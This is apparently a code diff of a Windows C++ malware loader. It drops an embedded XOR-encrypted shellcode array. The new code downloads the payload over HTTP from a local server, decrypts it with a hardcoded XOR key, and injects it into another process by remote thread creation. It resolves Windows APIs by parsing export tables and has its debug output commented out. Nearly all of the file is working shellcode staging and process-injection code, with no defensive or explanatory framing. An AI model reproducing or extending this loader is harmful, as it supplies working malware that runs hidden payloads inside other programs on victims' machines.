@@ -1,9 +1,8 @@
 #include <iostream>
 #pragma once
 #include <Windows.h>
-
-UCHAR payload[] = "\x10\xb2\x88\x70\x79\xe7\xbc\xc1\x2c\xd5\x24\x02\x58\x31\x64\x10\xbc\x69\x0a\x31\x64\x58\xd9\xfa\x58\x31\x64\x14\xba\x9c\x10\xbc\x69\x05\x31\x64\x58\xce\xb4\x10\xbc\x71\x07\x31\x64\x58\x79\xe9\x55\x7c\x64\x58\x31\x8c\x27\x31\x64\x58\x7c\x57\x91\x7d\xe9\x5d\x50\x64\x58\x31\x2c\xd5\x24\x2a\x58\x31\x64\x10\x02\xad\xa7\xe1\x2c\xd5\x24\x32\x58\x31\x64\x10\xbc\x69\x52\x31\x64\x58\xd9\x32\x58\x31\x64\x10\x02\xad\xa7\xe1\x2f\x1d\x63\x2a\x1d\x7d\x57\x6a\x1f\x20\x14\x7d\x64\x14\x5e\x05\x3c\x7d\x0d\x3a\x43\x05\x2a\x48\x25\x58\x64\x37\x1d\x63\x57\x6a\x1f\x20\x14\x7d\x64\x15\x54\x17\x2b\x50\x03\x3d\x73\x0b\x20\x70\x64\x10\x54\x08\x34\x5e\x44\x2f\x5e\x16\x34\x55\x64\x15\x54\x17\x2b\x50\x03\x3d\x31\x21\x20\x58\x10\x08\x43\x0b\x3b\x54\x17\x2b\x31\x2c\xdb\xdd\x4c\x3d\x7d\xef\x5c\x14\x04\x58\x31\x64\x15\xba\x24\x40\x7c\xe9\x38\x21\x29\xd3\x35\x40\xa4\x78\xef\x20\x51\x2c\xd3\xc0\xc8\xdc\xf1\x10\x7e\xbb\x43\xd8\xcd\x05\x24\x32\xe4\xb4\x11\x5e\xb8\x44\x6c\x10\xce\xa3\x10\xce\xa3\xb3\xd4\x29\xd3\x31\x29\x63\xf5\x11\x8e\x79\x57\x98\xd8\xc3\x58\x31\x64\x11\xba\x3c\x68\x75\xef\x13\x0d\x28\x5b\xfa\x2d\xd9\xf0\xec\x58\x31\x64\x1d\xba\x4d\x15\xb4\x89\x2d\x39\x2c\x6b\xf1\x8d\xdd\x31\x64\x58\x7f\xe9\x5c\x1a\x21\xd3\x40\x60\x15\x32\x91\x19\xba\x2c\x40\x74\xef\x08\x11\x28\x5b\xe2\x9b\x91\x7c\xe9\x54\xbb\x25\xd3\x08\x2c\x5b\xca\x2c\xd3\xc3\xc2\x2d\x39\xee\x5e\xb5\xa4\x2c\x38\x8f\xad\xd3\x82\x10\x02\xa4\xb3\x7f\x21\xd3\x79\x40\x14\x32\xaf\x3e\x70\xef\x54\x78\x21\xd3\x79\x78\x14\x32\xaf\x19\xba\x60\xd1\x78\x5f\x9d\x4d\x4b\x11\x0a\xa2\x2b\x1b\x2c\xd5\x05\x7c\x10\xbc\x18\x7c\x01\x28\xd3\xd6\xc0\xd8\x0f\x4a\x2d\xcb\xc0\x9f\x36\x20\x14\x7d\x64\x11\xba\xa8\x19\xce\xb3\x11\xba\xa8\x10\xba\xb2\xb1\x25\x9b\xa7\xce\x2c\x5b\xf2\x2c\xdb\xf5\x4c\x9b";
-SIZE_T sPayloadSize = 433;
+#include <winhttp.h>
+#pragma comment(lib, "winhttp.lib")
 
 typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
 typedef BOOL(WINAPI* WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
@@ -94,7 +93,7 @@ PVOID GetProcAddressFromExportTable(PBYTE pPeBuffer, const char* functionName) {
 
     // Validate the DOS header
     if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
-        printf("Invalid DOS Header signature.\n");
+        //printf("Invalid DOS Header signature.\n");
         return NULL;
     }
 
@@ -103,7 +102,7 @@ PVOID GetProcAddressFromExportTable(PBYTE pPeBuffer, const char* functionName) {
 
     // Validate the NT headers
     if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
-        printf("Invalid NT Headers signature.\n");
+        //printf("Invalid NT Headers signature.\n");
         return NULL;
     }
 
@@ -136,7 +135,7 @@ PVOID GetProcAddressFromExportTable(PBYTE pPeBuffer, const char* functionName) {
     }
 
     // Function not found
-    printf("Function %s not found in export table.\n", functionName);
+    //printf("Function %s not found in export table.\n", functionName);
     return NULL;
 }
 
@@ -178,6 +177,99 @@ void FreeLib(ChargeDLL* chargeDLL) {
 
 }
 
+BOOL InjectShellcode(LPVOID payload, SIZE_T payloadSize, DWORD processId) {
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (hProcess == NULL) {
+        //printf("Échec. Code d'erreur: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+    if (remoteMemory == NULL) {
+        //printf("Erreur VirtualAllocEx: %lu\n", GetLastError());
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    SIZE_T bytesWritten;
+    if (!WriteProcessMemory(hProcess, remoteMemory, payload, payloadSize, &bytesWritten)) {
+        //printf("Erreur WriteProcessMemory: %lu\n", GetLastError());
+        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
+    if (hThread == NULL) {
+        //printf("Erreur CreateRemoteThread: %lu\n", GetLastError());
+        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    WaitForSingleObject(hThread, INFINITE);
+    //VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
+    //CloseHandle(hThread);
+    //CloseHandle(hProcess);
+
+    return TRUE;
+}
+
+HINTERNET Open() {
+    return WinHttpOpen(L"A WinHTTP Example Program/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+}
+
+HINTERNET Connect(HINTERNET hSession, const wchar_t host[], int port) {
+    return WinHttpConnect(hSession, host, port, 0);
+}
+
+HINTERNET OpenRequest(HINTERNET hConnect, const wchar_t path[]) {
+    return WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+}
+
+BOOL SendRequest(HINTERNET hRequest) {
+    return WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+}
+
+LPSTR CheckData(HINTERNET hRequest) {
+    DWORD dwSize = 0;
+    DWORD dwDownloaded = 0;
+    LPSTR pszOutBuffer;
+    do {
+        dwSize = 0;
+
+        // Check for available data
+        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
+            std::cout << "Error " << GetLastError() << " in WinHttpQueryDataAvailable.\n";
+            break;
+        }
+
+        // Allocate space for the buffer
+        //pszOutBuffer = new char[dwSize + 1];
+        char* pszOutBuffer = (char*)LocalAlloc(LPTR, dwSize + 1);
+        if (!pszOutBuffer) {
+            std::cout << "Out of memory\n";
+            dwSize = 0;
+        }
+        else {
+            // Read the data
+            ZeroMemory(pszOutBuffer, dwSize + 1);
+
+            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
+                dwSize, &dwDownloaded)) {
+                std::cout << "Error " << GetLastError() << " in WinHttpReadData.\n";
+            }
+            else {
+                //std::cout << pszOutBuffer;
+            }
+            return pszOutBuffer;
+            // Free the memory allocated to the buffer
+            LocalFree(pszOutBuffer);
+            //delete[] pszOutBuffer;
+        }
+    } while (dwSize > 0);
+}
+
 int main()
 {
     ChargeDLL chargeDLL = { 0 };
@@ -188,14 +280,49 @@ int main()
     if (chargeDLL.pCreateThread == NULL) return 0;
     if (chargeDLL.pVirtualFree == NULL) return 0;
 
-    void* addr = chargeDLL.pVirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    const SIZE_T sPayloadSize = 433;
+    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+    DWORD dwSize = 0;
+    DWORD dwDownloaded = 0;
+    LPSTR pszOutBuffer;
+    BOOL bResults = FALSE;
 
+    // Initialize WinHTTP
+    hSession = Open();
+
+    if (hSession)
+        hConnect = Connect(hSession, L"127.0.0.1", 8080);
+
+    if (hConnect)
+        hRequest = OpenRequest(hConnect, L"/Desktop/Work/Codespython/Test/test");
+
+    // Send a request
+    if (hRequest)
+        bResults = SendRequest(hRequest);
+
+    // Receive the response
+    if (bResults)
+        bResults = WinHttpReceiveResponse(hRequest, NULL);
+
+    // Keep checking for data until there is nothing left
+    LPSTR shell = CheckData(hRequest);
+    //printf("%s \n \n", shell);
+
+    // Close handles
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
+
+    if (!bResults) std::cout << "Error " << GetLastError() << " has occurred.\n";
+
+    void* addr = chargeDLL.pVirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (addr == 0) {
         return 1;
     }
-
     size_t bytesWritten = 0;
-    const size_t SHELLCODE_SIZE = sizeof(payload);
+
+
+    const size_t SHELLCODE_SIZE = sPayloadSize + 1; //sizeof(shell);
 
     const unsigned char KEY[] = { 0x58, 0x31, 0x64 };
     const size_t KEY_SIZE = sizeof(KEY);
@@ -204,20 +331,15 @@ int main()
     UCHAR decryptedPayload[SHELLCODE_SIZE] = {};
 
     for (size_t i = 0; i < SHELLCODE_SIZE - 1; ++i) {
-        decryptedPayload[i] = payload[i] ^ KEY[i % KEY_SIZE];
+        decryptedPayload[i] = shell[i] ^ KEY[i % KEY_SIZE];
         //printf("/%x", decryptedPayload[i]);
     };
 
-    chargeDLL.pWriteProcessMemory(chargeDLL.pGetCurrentProcess(), addr, decryptedPayload, sPayloadSize, &bytesWritten);
+    DWORD pid = 27132;
 
-    DWORD dwPro;
-    chargeDLL.pVirtualProtect(addr, sPayloadSize, PAGE_EXECUTE_READ, &dwPro);
-
-    chargeDLL.pCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
+    InjectShellcode(decryptedPayload, SHELLCODE_SIZE, pid);
 
     Sleep(10000);
-    //void (*ret)() = (void(*)())addr;
-    //ret();
 
     chargeDLL.pVirtualFree(addr, 0, MEM_RELEASE);
 
